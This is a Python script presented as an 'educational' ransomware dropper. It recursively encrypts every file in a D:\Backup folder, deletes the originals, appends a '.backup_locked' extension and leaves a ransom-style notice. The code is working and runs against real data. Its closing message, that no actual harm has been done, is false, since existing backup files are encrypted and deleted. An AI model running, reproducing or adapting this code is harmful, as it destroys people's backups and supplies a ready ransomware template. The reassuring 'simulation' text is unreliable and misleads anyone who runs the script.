#!/usr/bin/env python3
"""
BACKUP FOLDER ENCRYPTION DROPPER
Educational dropper that encrypts D:\Backup folder
"""

import os
import sys
import base64
from pathlib import Path
from cryptography.fernet import Fernet
import time

class BackupFolderEncryptor:
    """Encrypts files in D:\Backup folder"""
    
    def __init__(self):
        self.target_directory = "D:\\Backup"
        self.encryption_extension = ".backup_locked"
        self.key = None
        
    def generate_key(self):
        """Generate encryption key"""
        self.key = Fernet.generate_key()
        return self.key
    
    def encrypt_backup_folder(self):
        """Encrypt all files in D:\Backup folder"""
        
        print("=" * 60)
        print("BACKUP FOLDER ENCRYPTION DROPPER")
        print("=" * 60)
        print(f"Target Directory: {self.target_directory}")
        print("=" * 60)
        
        # Check if target directory exists
        backup_path = Path(self.target_directory)
        if not backup_path.exists():
            print(f"[ERROR] Target directory not found: {self.target_directory}")
            print("[INFO] Creating demo directory for testing...")
            backup_path.mkdir(parents=True, exist_ok=True)
            
            # Create some demo files
            demo_files = {
                "important_backup.txt": "This is important backup data that should be protected",
                "family_photos.zip": "Compressed family photos and memories",
                "work_documents.rar": "Work-related documents and projects",
                "financial_records.xlsx": "Bank statements and financial records"
            }
            
            for filename, content in demo_files.items():
                file_path = backup_path / filename
                with open(file_path, 'w') as f:
                    f.write(content)
            print("[INFO] Created demo files for testing")
        
        print("[STATUS] Generating encryption key...")
        self.generate_key()
        cipher = Fernet(self.key)
        time.sleep(1)
        
        print(f"[TARGET] Encrypting files in {self.target_directory}")
        
        encrypted_count = 0
        failed_count = 0
        
        # Process all files recursively
        for file_path in backup_path.rglob("*"):
            if file_path.is_file() and not file_path.name.endswith(self.encryption_extension):
                try:
                    print(f"[ENCRYPTING] {file_path.name}")
                    
                    # Read file content
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    
                    # Encrypt data
                    encrypted_data = cipher.encrypt(data)
                    
                    # Write encrypted file
                    new_path = str(file_path) + self.encryption_extension
                    with open(new_path, 'wb') as f:
                        f.write(encrypted_data)
                    
                    # Remove original file
                    file_path.unlink()
                    encrypted_count += 1
                    print(f"  -> Successfully encrypted")
                    
                except Exception as e:
                    print(f"  -> Failed to encrypt: {e}")
                    failed_count += 1
        
        print(f"[COMPLETE] Encryption Results:")
        print(f"  - Successfully encrypted: {encrypted_count} files")
        print(f"  - Failed to encrypt: {failed_count} files")
        print(f"  - Extension used: {self.encryption_extension}")
        
        # Create ransom note
        self.create_ransom_note(backup_path, encrypted_count)
        
        print("=" * 60)
        print("BACKUP FOLDER ENCRYPTION COMPLETE")
        print("=" * 60)
        
        # Display encryption key for educational purposes
        print(f"\n[KEY] Encryption Key (for recovery):")
        print(base64.b64encode(self.key).decode())
        print("\n⚠️  This is an educational simulation only!")
        print("⚠️  No actual harm has been done to your system.")
        
        input("\nPress Enter to exit...")
    
    def create_ransom_note(self, directory_path, encrypted_count):
        """Create educational ransom note"""
        note_content = f"""================================
    BACKUP FOLDER ENCRYPTION NOTICE
================================

Your backup files have been encrypted by educational ransomware.

Target Directory: {self.target_directory}
Files Encrypted: {encrypted_count}
Extension Added: {self.encryption_extension}

This is an educational simulation designed to demonstrate:
- How ransomware targets backup directories
- The importance of offline backups
- Why backup security is crucial

Educational Purpose Only
================================
"""
        
        note_path = directory_path / "BACKUP_ENCRYPTION_NOTICE.txt"
        with open(note_path, 'w') as f:
            f.write(note_content)
        
        print(f"[NOTE] Created educational notice: {note_path.name}")

def main():
    """Main execution function"""
    encryptor = BackupFolderEncryptor()
    encryptor.encrypt_backup_folder()

if __name__ == "__main__":
    main()